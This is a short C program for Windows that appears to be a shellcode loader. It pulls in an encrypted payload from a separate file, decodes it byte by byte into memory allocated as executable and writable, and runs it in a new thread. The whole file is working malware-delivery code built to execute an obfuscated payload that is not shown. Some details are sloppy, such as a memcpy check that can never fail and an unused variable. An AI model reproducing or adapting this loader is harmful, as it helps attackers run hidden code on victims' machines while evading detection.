#include <windows.h>
#include <stdio.h>
#include "encrypted_shellcode.c"

int main() {
    // Get a handle to the current process
    HANDLE hProcess = GetCurrentProcess();

    // Allocate memory for the new code section
    LPVOID codeSection = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write the code into the new section using memcpy
    SIZE_T numBytesWritten;
    unsigned char buf;
    for (int i=0; i < sizeof(encrypted_shellcode); i++){
        buf = get_shellcode_byte(i);
        if (!memcpy(codeSection+i, &buf, sizeof(buf))) {
            printf("Failed to copy code into allocated memory\n");
            return 1;
        }
    }

    // Create a new thread to execute the code
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)codeSection, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread\n");
        return 1;
    }

    // Wait for the thread to finish executing
    WaitForSingleObject(hThread, INFINITE);

    // Clean up resources
    VirtualFreeEx(hProcess, codeSection, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}